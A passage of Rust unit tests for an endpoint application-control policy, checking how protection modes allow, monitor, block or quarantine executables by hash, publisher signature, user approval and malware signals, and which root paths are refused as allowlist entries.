        let policy = ApplicationControlPolicy::new(ProtectionMode::BlockConfirmedThreats);

        let result = policy.evaluate(&input);

        assert_eq!(result.decision, ApplicationControlDecision::AllowAndMonitor);
        assert_eq!(result.trust_level, ApplicationTrustLevel::Suspicious);
        assert!(!result.label_as_malware);
        assert!(!result.requires_user_approval);
        assert!(result.monitor_process);
    }

    #[test]
    fn lockdown_blocks_probable_review_item_without_quarantine_or_malware_label() {
        let mut input =
            ApplicationControlInput::for_path("C:\\Users\\Brent\\Downloads\\review.exe");
        input.probable_malware = true;
        input.strong_risk_signal = true;
        let policy = ApplicationControlPolicy::new(ProtectionMode::Lockdown);

        let result = policy.evaluate(&input);

        assert_eq!(result.decision, ApplicationControlDecision::Block);
        assert_eq!(result.trust_level, ApplicationTrustLevel::Suspicious);
        assert!(result.requires_user_approval);
        assert!(!result.label_as_malware);
        assert!(!result.monitor_process);
    }

    #[test]
    fn monitor_only_does_not_quarantine_probable_review_item() {
        let mut input =
            ApplicationControlInput::for_path("C:\\Users\\Brent\\Downloads\\review.exe");
        input.probable_malware = true;
        input.strong_risk_signal = true;
        let policy = ApplicationControlPolicy::new(ProtectionMode::MonitorOnly);

        let result = policy.evaluate(&input);

        assert_eq!(result.decision, ApplicationControlDecision::AllowAndMonitor);
        assert_eq!(result.trust_level, ApplicationTrustLevel::Suspicious);
        assert!(!result.label_as_malware);
        assert!(result.monitor_process);
    }

    #[test]
    fn confirmed_malware_still_quarantines_when_protection_enabled() {
        let mut input = ApplicationControlInput::for_path("C:\\Users\\Brent\\Downloads\\bad.exe");
        input.confirmed_malware = true;
        let policy = ApplicationControlPolicy::new(ProtectionMode::BlockConfirmedThreats);

        let result = policy.evaluate(&input);

        assert_eq!(result.decision, ApplicationControlDecision::Quarantine);
        assert_eq!(result.trust_level, ApplicationTrustLevel::ConfirmedMalware);
        assert!(result.label_as_malware);
    }

    #[test]
    fn confirmed_malware_overrides_malformed_application_hash() {
        let mut input = ApplicationControlInput::for_path("C:\\Users\\Brent\\Downloads\\bad.exe");
        input.sha256 = Some("not-a-sha256".to_string());
        input.confirmed_malware = true;
        let policy = ApplicationControlPolicy::new(ProtectionMode::BlockConfirmedThreats);

        let result = policy.evaluate(&input);

        assert_eq!(result.decision, ApplicationControlDecision::Quarantine);
        assert_eq!(result.trust_level, ApplicationTrustLevel::ConfirmedMalware);
        assert!(result.label_as_malware);
    }

    #[test]
    fn balanced_allows_unknown_benign_executable_with_monitoring() {
        let input = ApplicationControlInput::for_path("C:\\Users\\Brent\\Downloads\\tool.exe");
        let policy = ApplicationControlPolicy::new(ProtectionMode::Balanced);

        let result = policy.evaluate(&input);

        assert_eq!(result.decision, ApplicationControlDecision::AllowAndMonitor);
        assert_eq!(result.trust_level, ApplicationTrustLevel::Unknown);
        assert!(!result.label_as_malware);
    }

    #[test]
    fn balanced_reports_malformed_application_hash_as_suspicious_metadata() {
        let mut input = ApplicationControlInput::for_path("C:\\Users\\Brent\\Downloads\\tool.exe");
        input.sha256 = Some("not-a-sha256".to_string());
        let policy = ApplicationControlPolicy::new(ProtectionMode::Balanced);

        let result = policy.evaluate(&input);

        assert_eq!(result.decision, ApplicationControlDecision::AllowAndMonitor);
        assert_eq!(result.trust_level, ApplicationTrustLevel::Suspicious);
        assert!(result.reason.contains("Malformed SHA-256 evidence"));
        assert!(result.monitor_process);
        assert!(!result.label_as_malware);
    }

    #[test]
    fn lockdown_blocks_unknown_unsigned_executable_without_malware_label() {
        let input = ApplicationControlInput::for_path("C:\\Users\\Brent\\Downloads\\vpn.exe");
        let policy = ApplicationControlPolicy::new(ProtectionMode::Lockdown);

        let result = policy.evaluate(&input);

        assert_eq!(result.decision, ApplicationControlDecision::Block);
        assert_eq!(result.trust_level, ApplicationTrustLevel::Unknown);
        assert!(result.requires_user_approval);
        assert!(!result.label_as_malware);
    }

    #[test]
    fn lockdown_blocks_malformed_application_hash_without_malware_label() {
        let mut input = ApplicationControlInput::for_path("C:\\Users\\Brent\\Downloads\\vpn.exe");
        input.sha256 = Some("sha256:not-a-real-hash".to_string());
        let policy = ApplicationControlPolicy::new(ProtectionMode::Lockdown);

        let result = policy.evaluate(&input);

        assert_eq!(result.decision, ApplicationControlDecision::Block);
        assert_eq!(result.trust_level, ApplicationTrustLevel::Suspicious);
        assert!(result.reason.contains("Malformed SHA-256 evidence"));
        assert!(result.requires_user_approval);
        assert!(!result.label_as_malware);
    }

    #[test]
    fn lockdown_allows_known_good_hash() {
        let mut input = ApplicationControlInput::for_path("C:\\Tools\\trusted.exe");
        input.sha256 = Some(format!("sha256:{TRUSTED_FIXTURE_HASH}"));
        let mut policy = ApplicationControlPolicy::new(ProtectionMode::Lockdown);
        policy.known_good =
            KnownGoodStore::from_hashes([TRUSTED_FIXTURE_HASH.to_string()]).unwrap();

        let result = policy.evaluate(&input);

        assert_eq!(result.decision, ApplicationControlDecision::Allow);
        assert_eq!(result.trust_level, ApplicationTrustLevel::KnownGoodHash);
    }

    #[test]
    fn lockdown_allows_trusted_publisher_signature() {
        let mut input = ApplicationControlInput::for_path("C:\\Program Files\\Vendor\\app.exe");
        input.signature_valid = true;
        input.publisher = Some("Contoso Trusted Apps".to_string());
        let mut policy = ApplicationControlPolicy::new(ProtectionMode::Lockdown);
        policy.trusted_publishers =
            TrustedPublisherPolicy::with_trusted(["contoso trusted apps".to_string()]).unwrap();

        let result = policy.evaluate(&input);

        assert_eq!(result.decision, ApplicationControlDecision::Allow);
        assert_eq!(result.trust_level, ApplicationTrustLevel::TrustedPublisher);
    }

    #[test]
    fn lockdown_rejects_lookalike_trusted_publisher_signature() {
        let mut input = ApplicationControlInput::for_path("C:\\Program Files\\Vendor\\app.exe");
        input.signature_valid = true;
        input.publisher = Some("Not Contoso Trusted Apps".to_string());
        let mut policy = ApplicationControlPolicy::new(ProtectionMode::Lockdown);
        policy.trusted_publishers =
            TrustedPublisherPolicy::with_trusted(["contoso trusted apps".to_string()]).unwrap();

        let result = policy.evaluate(&input);

        assert_eq!(result.decision, ApplicationControlDecision::Block);
        assert_eq!(result.trust_level, ApplicationTrustLevel::Unknown);
        assert!(result.requires_user_approval);
    }

    #[test]
    fn strong_probable_malware_overrides_known_good_hash() {
        let mut input = ApplicationControlInput::for_path("C:\\Tools\\trusted.exe");
        input.sha256 = Some(format!("sha256:{TRUSTED_FIXTURE_HASH}"));
        input.probable_malware = true;
        input.strong_risk_signal = true;
        let mut policy = ApplicationControlPolicy::new(ProtectionMode::Lockdown);
        policy.known_good =
            KnownGoodStore::from_hashes([TRUSTED_FIXTURE_HASH.to_string()]).unwrap();

        let result = policy.evaluate(&input);

        assert_eq!(result.decision, ApplicationControlDecision::Block);
        assert_eq!(result.trust_level, ApplicationTrustLevel::Suspicious);
        assert!(!result.label_as_malware);
    }

    #[test]
    fn strong_probable_malware_overrides_exact_hash_user_approval() {
        let mut input = ApplicationControlInput::for_path("C:\\Users\\Brent\\Downloads\\cli.exe");
        input.sha256 = Some(format!("sha256:{USER_APPROVED_FIXTURE_HASH}"));
        input.probable_malware = true;
        input.strong_risk_signal = true;
        let mut approvals = UserApprovalStore::default();
        approvals
            .approve_hash(USER_APPROVED_FIXTURE_HASH.to_string())
            .unwrap();
        let mut policy = ApplicationControlPolicy::new(ProtectionMode::Lockdown);
        policy.user_approvals = approvals;

        let result = policy.evaluate(&input);

        assert_eq!(result.decision, ApplicationControlDecision::Block);
        assert_eq!(result.trust_level, ApplicationTrustLevel::Suspicious);
        assert!(!result.label_as_malware);
    }

    #[test]
    fn strong_probable_malware_overrides_trusted_publisher() {
        let mut input = ApplicationControlInput::for_path("C:\\Program Files\\Vendor\\app.exe");
        input.signature_valid = true;
        input.publisher = Some("Contoso Trusted Apps".to_string());
        input.probable_malware = true;
        input.strong_risk_signal = true;
        let mut policy = ApplicationControlPolicy::new(ProtectionMode::Lockdown);
        policy.trusted_publishers =
            TrustedPublisherPolicy::with_trusted(["contoso trusted apps".to_string()]).unwrap();

        let result = policy.evaluate(&input);

        assert_eq!(result.decision, ApplicationControlDecision::Block);
        assert_eq!(result.trust_level, ApplicationTrustLevel::Suspicious);
        assert!(!result.label_as_malware);
    }

    #[test]
    fn lockdown_allows_exact_hash_after_user_approval() {
        let mut input = ApplicationControlInput::for_path("C:\\Users\\Brent\\Downloads\\cli.exe");
        input.sha256 = Some(format!("sha256:{USER_APPROVED_FIXTURE_HASH}"));
        let mut approvals = UserApprovalStore::default();
        approvals
            .approve_hash(USER_APPROVED_FIXTURE_HASH.to_string())
            .unwrap();
        let mut policy = ApplicationControlPolicy::new(ProtectionMode::Lockdown);
        policy.user_approvals = approvals;

        let result = policy.evaluate(&input);

        assert_eq!(result.decision, ApplicationControlDecision::Allow);
        assert_eq!(result.trust_level, ApplicationTrustLevel::UserApproved);
    }

    #[test]
    fn dangerous_root_allowlist_paths_are_blocked() {
        assert!(is_dangerous_allowlist_path(Path::new("C:\\")));
        assert!(is_dangerous_allowlist_path(Path::new("C:\\Windows")));
        assert!(is_dangerous_allowlist_path(Path::new("C:\\ProgramData")));
        assert!(is_dangerous_allowlist_path(Path::new("C:\\Users")));
        assert!(is_dangerous_allowlist_path(Path::new("D:\\")));
        assert!(is_dangerous_allowlist_path(Path::new("D:\\Program Files")));
        assert!(is_dangerous_allowlist_path(Path::new("/")));
        assert!(is_dangerous_allowlist_path(Path::new("/usr")));
        assert!(!is_dangerous_allowlist_path(Path::new(
            "C:\\Users\\Brent\\Downloads\\trusted.exe"
        )));
    }
}
